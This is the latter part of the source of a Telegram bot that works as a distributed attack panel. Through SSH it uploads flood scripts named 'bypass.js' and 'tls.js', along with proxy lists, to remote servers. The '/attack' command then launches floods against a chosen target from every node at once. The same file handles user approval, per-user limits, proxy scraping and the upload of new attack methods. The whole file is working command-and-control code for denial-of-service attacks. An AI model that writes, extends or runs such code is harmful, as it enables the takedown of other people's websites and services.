    healthCache.set(id, { online: true, load: '?', at: Date.now() });
    audit('server_added', msg.from.id, { id, host, port, username });
    const stats = serverStats();
    await edit(msg.chat.id, sm.message_id,
      `✅ <b>Server added</b> <code>${id}</code>\n\n📡 Now: <b>${stats.online}/${stats.total}</b> online`);
  } catch (e) {
    upsertServer({ id, status: 'error', lastCheck: Date.now() });
    await edit(msg.chat.id, sm.message_id, `❌ Failed: <code>${esc(e.message.slice(0, 150))}</code>`);
  }
}

cmd('delserver', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: <code>/delserver &lt;id&gt;</code>');
  if (!getServer(id)) return reply(msg, '❌ Not found.');
  removeServer(id);
  await reply(msg, `✅ Removed <code>${id}</code>`);
});

cmd('sync', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: <code>/sync &lt;id&gt;</code>');
  if (!getServer(id)) return reply(msg, '❌ Not found.');
  const sm = await reply(msg, `🔄 Syncing <code>${id}</code>...`);
  try {
    const conn = await getServerConn(id);
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
    for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
      const local = path.join(CONFIG.SCRIPT_DIR, f);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
    }
    for (const m of loadCustomMethods()) {
      const local = path.join(CONFIG.SCRIPT_DIR, m.file);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${m.file}`);
    }
    const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(p)) await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    upsertServer({ id, status: 'online', lastCheck: Date.now() });
    await edit(msg.chat.id, sm.message_id, `✅ Synced <code>${id}</code>`);
  } catch (e) {
    await edit(msg.chat.id, sm.message_id, `❌ <code>${esc(e.message.slice(0, 150))}</code>`);
  }
});

cmd('syncall', async (msg) => {
  if (!adminOnly(msg)) return;
  const servers = loadServers();
  if (!servers.length) return reply(msg, '📭 No servers.');
  const sm = await reply(msg, `🔄 Syncing ${servers.length} servers...`);
  let ok = 0, fail = 0, done = 0;
  for (const s of servers) {
    try {
      const conn = await getServerConn(s.id);
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
      for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
        const local = path.join(CONFIG.SCRIPT_DIR, f);
        if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
      }
      for (const m of loadCustomMethods()) {
        const local = path.join(CONFIG.SCRIPT_DIR, m.file);
        if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${m.file}`);
      }
      const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
      if (fs.existsSync(p)) await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
      upsertServer({ id: s.id, status: 'online', lastCheck: Date.now() });
      ok++;
    } catch { upsertServer({ id: s.id, status: 'offline' }); fail++; }
    done++;
    await edit(msg.chat.id, sm.message_id, `🔄 ${done}/${servers.length} — ✅ ${ok} · ❌ ${fail}`);
  }
  await edit(msg.chat.id, sm.message_id, `✅ Done: <b>${ok}</b> ok · <b>${fail}</b> failed`);
});

cmd('attack', async (msg, args) => {
  const user = ensureUserExists(msg);
  if (user.role === 'pending') return reply(msg, '⏳ Account pending approval.');
  if (user.role === 'banned') return reply(msg, '🚫 Banned.');

  const methodId = args[0];
  if (!methodId) return reply(msg, 'Usage: <code>/attack &lt;method&gt; &lt;args...&gt;</code>\nSee /methods');

  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method <code>${methodId}</code>`);
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) return reply(msg, `❌ Missing: ${method.file}`);

  const cd = cooldowns.get(msg.from.id);
  if (cd && cd.until > Date.now()) {
    const left = Math.ceil((cd.until - Date.now()) / 1000);
    return reply(msg, `⏳ Cooldown: <b>${left}s</b>`);
  }

  const limit = user.limits?.maxConcurrent || 0;
  if (limit > 0 && userActiveSessions(msg.from.id) >= limit) {
    return reply(msg, `❌ Max concurrent (${limit}).`);
  }

  let parsed;
  try {
    parsed = method.parse(args.slice(1));
    if (!parsed.target || !parsed.duration) {
      return reply(msg, `❌ Missing args.\nUsage: <code>${esc(method.example)}</code>`);
    }
    const t = validateTarget(parsed.target);
    if (isBlacklisted(t.host)) return reply(msg, `🚫 <code>${esc(t.host)}</code> blacklisted.`);
    checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
  } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

  const useLocal = true;
  const serversToUse = loadServers().filter(s => s.status === 'online');
  const totalTargets = 1 + serversToUse.length;

  const progress = await reply(msg,
    `🚀 <b>Launching</b> ${method.name}\n` +
    `Target: <code>${esc(parsed.target)}</code>\n` +
    `${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R\n\n` +
    `⚡ Dispatching to ${totalTargets} node(s)...`);

  await prewarmServers(serversToUse.map(s => s.id));

  const launchPromises = [];

  launchPromises.push((async () => {
    try {
      const session = launchLocal(user, method, parsed.args, msg.chat.id);
      return { ok: true, session };
    } catch (e) {
      return { ok: false, error: e.message };
    }
  })());

  for (const s of serversToUse) {
    launchPromises.push((async () => {
      try {
        const session = await launchRemote(user, method, parsed.args, s.id, msg.chat.id);
        return { ok: true, session };
      } catch (e) {
        return { ok: false, error: e.message };
      }
    })());
  }

  const launched = await Promise.all(launchPromises);

  if (user.limits && user.limits.cooldown > 0) {
    cooldowns.set(user.telegramId, { until: Date.now() + user.limits.cooldown * 1000 });
  }

  const okCount = launched.filter(l => l.ok).length;
  const newStats = serverStats();

  audit('attack_launched', msg.from.id, {
    method: method.id, target: parsed.target,
    servers: serversToUse.map(s => s.id), ok: okCount,
  });

  const lines = [
    okCount > 0 ? '✅ <b>Attack dispatched</b>' : '❌ <b>Attack failed</b>',
    '',
    `Method: <b>${method.name}</b>`,
    `Target: <code>${esc(parsed.target)}</code>`,
    `${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R`,
    '',
    `📡 <b>Servers:</b> ${newStats.online}/${newStats.total} online · ${newStats.attacking} attacking`,
    `🎯 <b>Launched:</b> ${okCount}/${totalTargets} node(s)`,
  ];

  if (okCount < totalTargets) {
    lines.push('');
    lines.push(`⚠️ ${totalTargets - okCount} node(s) failed — contact admin`);
  }

  await edit(msg.chat.id, progress.message_id, lines.join('\n'));
});

cmd('status', async (msg) => {
  const user = ensureUserExists(msg);
  const mine = [...sessions.values()].filter(s => s.owner === msg.from.id && s.status === 'running');
  const stats = serverStats();

  const header = `📡 <b>${stats.online}/${stats.total}</b> online · <b>${stats.attacking}</b> attacking\n`;

  if (mine.length === 0) return reply(msg, header + '\n📭 No active sessions.');

  const txt = [header, `<b>Your sessions (${mine.length}):</b>`, ''];
  mine.forEach(s => {
    const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
    txt.push(`<code>${s.id}</code> · ${s.methodName} · ${esc(s.target)}`);
    txt.push(`  ${elapsed}s/${s.duration}s`);
  });

  await reply(msg, txt.join('\n'));
});

cmd('stop', async (msg, args) => {
  const user = ensureUserExists(msg);
  const id = args[0];
  if (!id) return reply(msg, 'Usage: <code>/stop &lt;id&gt;</code>');
  const s = sessions.get(id);
  if (!s) return reply(msg, '❌ Not found.');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not your session.');
  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped <code>${id}</code>`);
});

cmd('killall', async (msg) => {
  if (!adminOnly(msg)) return;
  const killed = stopAllSessions(null);
  await reply(msg, killed > 0 ? `💀 Killed <b>${killed}</b> session(s).` : '📭 No active sessions.');
});

cmd('scrape', async (msg) => {
  const user = ensureUserExists(msg);
  if (!isAdmin(msg.from.id) && user.role !== 'user') return reply(msg, '❌ Denied.');
  await reply(msg, '🔄 Scraping...');
  try {
    const n = await scrapeProxies();
    await reply(msg, `✅ <b>${n}</b> proxies ready\n\n<i>Admin: /syncall to push to servers</i>`);
  } catch (e) { await reply(msg, `❌ ${esc(e.message)}`); }
});

cmd('users', async (msg) => {
  if (!adminOnly(msg)) return;
  const list = Object.values(loadUsers());
  if (!list.length) return reply(msg, '<i>No users.</i>');
  const txt = [`<b>Users (${list.length}):</b>`, ''];
  list.forEach(u => {
    const l = u.limits || {};
    const icon = u.role === 'admin' ? '👑' : u.role === 'user' ? '✅' : u.role === 'banned' ? '🚫' : '⏳';
    txt.push(`${icon} <code>${u.telegramId}</code> · ${u.role}`);
    txt.push(`  dur=${l.maxDuration || '∞'} th=${l.maxThreads || '∞'} rate=${l.maxRate || '∞'} cd=${l.cooldown || 0}s`);
  });
  await reply(msg, txt.join('\n'));
});

cmd('approve', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: <code>/approve &lt;id&gt;</code>');
  if (!getUser(id)) return reply(msg, '❌ Not found.');
  upsertUser(id, { role: 'user' });
  await reply(msg, `✅ Approved.`);
});

cmd('ban', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: <code>/ban &lt;id&gt;</code>');
  if (isAdmin(id)) return reply(msg, '❌ Cannot ban admin.');
  if (!getUser(id)) return reply(msg, '❌ Not found.');
  upsertUser(id, { role: 'banned' });
  await reply(msg, `🚫 Banned.`);
});

cmd('adduser', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: <code>/adduser &lt;id&gt;</code>');
  if (getUser(id)) return reply(msg, '⚠️ Exists.');
  upsertUser(id, {
    telegramId: id, role: 'user', createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
  await reply(msg, `✅ Created.`);
});

cmd('setlimit', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const [idStr, field, valStr] = args;
  const id = Number(idStr), value = Number(valStr);
  if (!id || !field || isNaN(value)) return reply(msg, 'Usage: <code>/setlimit &lt;id&gt; &lt;field&gt; &lt;val&gt;</code>');
  if (!['maxDuration', 'maxThreads', 'maxRate', 'maxConcurrent', 'cooldown'].includes(field)) return reply(msg, '❌ Invalid field.');
  const u = getUser(id);
  if (!u) return reply(msg, '❌ Not found.');
  upsertUser(id, { limits: { ...(u.limits || {}), [field]: value } });
  await reply(msg, `✅ Updated.`);
});

cmd('blacklist', async (msg) => {
  if (!adminOnly(msg)) return;
  const l = loadBlacklist();
  if (!l.length) return reply(msg, '<i>Empty.</i>');
  await reply(msg, '<b>Blacklisted:</b>\n' + l.map(h => `• <code>${esc(h)}</code>`).join('\n'));
});

cmd('black', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const h = normalizeHost(args[0]);
  if (!h) return reply(msg, 'Usage: <code>/black &lt;host&gt;</code>');
  const l = loadBlacklist();
  if (l.includes(h)) return reply(msg, '⚠️ Already.');
  l.push(h); saveBlacklist(l);
  await reply(msg, `✅ Blocked.`);
});

cmd('unblack', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const h = normalizeHost(args[0]);
  const l = loadBlacklist();
  const i = l.indexOf(h);
  if (i < 0) return reply(msg, '❌ Not found.');
  l.splice(i, 1); saveBlacklist(l);
  await reply(msg, `✅ Removed.`);
});

cmd('stats', async (msg) => {
  if (!adminOnly(msg)) return;
  const users = loadUsers();
  const total = Object.keys(users).length;
  const admins = Object.values(users).filter(u => u.role === 'admin').length;
  const pending = Object.values(users).filter(u => u.role === 'pending').length;
  const s = serverStats();
  const active = [...sessions.values()].filter(x => x.status === 'running').length;

  await reply(msg, [
    '<b>Global Stats</b>',
    '',
    `👥 Users: <b>${total}</b> (${admins} admin, ${pending} pending)`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online · <b>${s.attacking}</b> attacking`,
    `⚔️ Sessions: <b>${active}</b>`,
    `🚫 Blacklist: ${loadBlacklist().length}`,
    `📦 Methods: ${availableMethods().length}`,
  ].join('\n'));
});

cmd('addmethod', async (msg) => {
  if (!adminOnly(msg)) return;
  pendingInput.set(msg.from.id, {
    action: 'addmethod_file',
    data: {},
    expires: Date.now() + 600000,
  });
  await reply(msg,
    '🔧 <b>Add new attack method</b>\n\n' +
    '📎 Send the <code>.js</code> file as a document.\n\n' +
    '<i>Bot will scan dependencies, ask for a sample command, then install everything on local + all servers.</i>\n\n' +
    '/cancel to abort'
  );
});

cmd('delmethod', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: <code>/delmethod &lt;id&gt;</code>');
  if (BUILTIN_METHODS.some(m => m.id === id)) return reply(msg, '❌ Built-in.');
  const list = loadCustomMethods();
  const i = list.findIndex(m => m.id === id);
  if (i < 0) return reply(msg, '❌ Not found.');
  list.splice(i, 1);
  saveCustomMethods(list);
  await reply(msg, `✅ Deleted <code>${id}</code>`);
});

cmd('cancel', async (msg) => {
  pendingInput.delete(msg.from.id);
  await reply(msg, '❎ Cancelled.');
});

/* ══════════════════════════ ROUTER ══════════════════════════ */

bot.on('message', async (msg) => {
  if (msg.document) {
    const p = pendingInput.get(msg.from.id);
    if (!p || p.action !== 'addmethod_file') return;
    if (p.expires && Date.now() > p.expires) {
      pendingInput.delete(msg.from.id);
      return reply(msg, '⏰ Expired.');
    }

    const fn = msg.document.file_name || 'method.js';
    if (!fn.endsWith('.js')) return reply(msg, '❌ Must be .js file.');

    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const tp = path.join(CONFIG.SCRIPT_DIR, fn);
      const r = await axios.get(link, { responseType: 'stream', timeout: 30000 });
      await new Promise((res, rej) => {
        const w = fs.createWriteStream(tp);
        r.data.pipe(w);
        w.on('finish', res);
        w.on('error', rej);
      });

      const deps = scanDependencies(tp);
      const missing = deps.filter(d => !isModuleInstalledLocally(d));

      p.data.fileName = fn;
      p.data.deps = deps;
      p.data.missing = missing;
      p.action = 'addmethod_sample';
      pendingInput.set(msg.from.id, p);

      const depLine = deps.length > 0
        ? `📦 Dependencies: ${deps.map(d => `<code>${esc(d)}</code>`).join(', ')}`
        : '📦 No external dependencies';
      const missingLine = missing.length > 0
        ? `\n⚠️ Will install: ${missing.map(d => `<code>${esc(d)}</code>`).join(', ')}`
        : '';

      await reply(msg,
        `✅ File <code>${esc(fn)}</code> received\n\n${depLine}${missingLine}\n\n` +
        'Now send a <b>sample command</b> for this method.\n\n' +
        'Example format:\n' +
        '<code>myatk https://target.com 60 16 90 cookies headers</code>\n\n' +
        'Bot will parse it and generate the attack template.'
      );
    } catch (e) {
      pendingInput.delete(msg.from.id);
      await reply(msg, `❌ ${esc(e.message)}`);
    }
    return;
  }

  if (!msg.text) return;
  const text = msg.text.trim();

  const pending = pendingInput.get(msg.from.id);
  if (pending && (!pending.expires || Date.now() < pending.expires)) {
    if (text === '/cancel') {
      pendingInput.delete(msg.from.id);
      return reply(msg, '❎ Cancelled.');
    }
    await handlePending(msg, pending, text);
    return;
  }

  if (!text.startsWith('/')) return;
  const parts = text.slice(1).split(/\s+/);
  const cmdName = parts[0].split('@')[0].toLowerCase();
  const args = parts.slice(1);
  const h = COMMANDS.get(cmdName);
  if (!h) return;

  try { await h(msg, args); }
  catch (e) { console.error(`[${cmdName}]`, e); try { await reply(msg, `❌ ${esc(e.message)}`); } catch {} }
});

/* ══════════════════════════ INTERACTIVE FLOWS ══════════════════════════ */

async function handlePending(msg, pending, text) {
  const data = pending.data || {};

  switch (pending.action) {
    case 'addserver_addr':
      if (!/^[\w.-]+:\d+$/.test(text)) return reply(msg, '❌ Format: <code>ip:port</code>');
      data.addr = text;
      pending.action = 'addserver_user';
      pendingInput.set(msg.from.id, pending);
      return reply(msg, '👤 SSH username:');
    case 'addserver_user':
      data.username = text;
      pending.action = 'addserver_pass';
      pendingInput.set(msg.from.id, pending);
      return reply(msg, '🔑 Password:');
    case 'addserver_pass':
      data.password = text;
      pending.action = 'addserver_name';
      pendingInput.set(msg.from.id, pending);
      try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}
      return reply(msg, '🏷 Server name (or <code>/skip</code>):');
    case 'addserver_name': {
      const name = text === '/skip' ? data.addr.split(':')[0] : text;
      pendingInput.delete(msg.from.id);
      return addServerFlow(msg, data.addr, data.username, data.password, name);
    }

    case 'addmethod_sample': {
      const { fileName, deps, missing } = data;
      const tokens = text.trim().split(/\s+/);
      if (tokens.length < 2) {
        return reply(msg, '❌ Sample needs at least the method name + one arg.\nExample: <code>myatk https://target.com 60 16 90</code>');
      }
      const methodId = tokens[0].toLowerCase();

      if (!/^[a-zA-Z0-9_-]{2,20}$/.test(methodId)) {
        return reply(msg, '❌ Method name in sample must be 2-20 chars (letters/numbers/_/-).');
      }
      if (allMethods().some(m => m.id === methodId)) {
        return reply(msg, `❌ Method ID <code>${methodId}</code> already exists. Use a different name in sample.`);
      }

      let parsed;
      try {
        parsed = parseSampleToTemplate(text);
      } catch (e) {
        return reply(msg, `❌ Parse failed: ${esc(e.message)}`);
      }

      const exampleLine = templateToExample(methodId, parsed.template, parsed.placeholders);

      data.methodId = methodId;
      data.template = parsed.template;
      data.placeholders = parsed.placeholders;
      data.example = exampleLine;
      pending.action = 'addmethod_confirm';
      pendingInput.set(msg.from.id, pending);

      const depLine = deps.length > 0
        ? `📦 Dependencies: ${deps.map(d => `<code>${esc(d)}</code>`).join(', ')}`
        : '📦 No external dependencies';
      const missingLine = missing.length > 0
        ? `\n⚡ Will install: ${missing.map(d => `<code>${esc(d)}</code>`).join(', ')}`
        : '';

      return reply(msg,
        '<b>Preview</b>\n\n' +
        `Method ID: <code>${methodId}</code>\n` +
        `File: <code>${esc(fileName)}</code>\n` +
        `Template: <code>${esc(parsed.template)}</code>\n` +
        `Example: <code>${esc(exampleLine)}</code>\n\n` +
        `${depLine}${missingLine}\n\n` +
        'Send <code>/confirm</code> to install &amp; register, or /cancel.'
      );
    }

    case 'addmethod_confirm': {
      if (text !== '/confirm') {
        return reply(msg, 'Send <code>/confirm</code> to proceed or /cancel.');
      }
      pendingInput.delete(msg.from.id);

      const { fileName, deps, missing, methodId, template, example } = data;

      const sm = await reply(msg, '⚙️ Registering method...');

      const list = loadCustomMethods();
      list.push({
        id: methodId,
        name: methodId,
        file: fileName,
        template,
        example,
        deps: deps || [],
        addedBy: msg.from.id,
        addedAt: new Date().toISOString(),
      });
      saveCustomMethods(list);

      if (missing && missing.length > 0) {
        await edit(msg.chat.id, sm.message_id, `📦 Installing local deps: ${missing.join(', ')}...`);
        const r = await installLocalDeps(missing);
        if (!r.ok) {
          await edit(msg.chat.id, sm.message_id, `❌ Local install failed: <code>${esc(r.err.slice(0, 200))}</code>`);
          return;
        }
      }

      await edit(msg.chat.id, sm.message_id, `✅ Method registered.\n\n📤 Syncing to all servers...`);

      const servers = loadServers().filter(s => s.status === 'online');
      const results = { ok: 0, fail: 0 };

      await Promise.all(servers.map(async (s) => {
        try {
          const conn = await getServerConn(s.id);
          await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
          const local = path.join(CONFIG.SCRIPT_DIR, fileName);
          await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${fileName}`);

          if (missing && missing.length > 0) {
            await sshExec(conn,
              `cd ${CONFIG.REMOTE_DIR} && npm install ${missing.join(' ')} --silent --no-audit --no-fund 2>&1 | tail -2`,
              180000
            );
          }
          results.ok++;
        } catch { results.fail++; }
      }));

      audit('method_added', msg.from.id, {
        id: methodId, file: fileName, deps, serversOk: results.ok, serversFail: results.fail,
      });

      await edit(msg.chat.id, sm.message_id,
        `✅ <b>Method added</b>\n\n` +
        `ID: <code>${methodId}</code>\n` +
        `Example: <code>${esc(example)}</code>\n\n` +
        `📤 Synced to ${results.ok}/${servers.length} servers\n\n` +
        `Try it: <code>/attack ${methodId} &lt;args...&gt;</code>`
      );
    }
  }
}

/* ══════════════════════════ STARTUP ══════════════════════════ */

(async () => {
  console.log('[bot] starting v5 (smart & notifier)...');
  console.log('[bot] script dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] admins:', CONFIG.ADMIN_IDS);
  console.log('[bot] methods:', availableMethods().map(m => m.id).join(', ') || '(none)');

  for (const id of CONFIG.ADMIN_IDS) {
    if (!getUser(id)) {
      upsertUser(id, {
        telegramId: id, role: 'admin', createdAt: new Date().toISOString(),
        limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
      });
      console.log(`[bot] admin ${id} bootstrapped`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] connected as @${me.username}`);
  } catch (e) { console.error('[bot] getMe:', e.message); }

  const servers = loadServers();
  if (servers.length > 0) {
    console.log(`[bot] pre-warming ${servers.length} server connections...`);
    prewarmServers(servers.map(s => s.id)).then(() => {
      const online = servers.filter(s => serverConns.has(s.id)).length;
      console.log(`[bot] ${online}/${servers.length} servers connected`);
    }).catch(() => {});
  }

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE))) {
    console.log('[bot] scraping proxies...');
    try { console.log(`[bot] ${await scrapeProxies()} proxies`); } catch (e) { console.error('[bot]', e.message); }
  }
})();

process.on('SIGINT', () => { console.log('\n[bot] bye'); process.exit(0); });
process.on('SIGTERM', () => { console.log('\n[bot] bye'); process.exit(0); });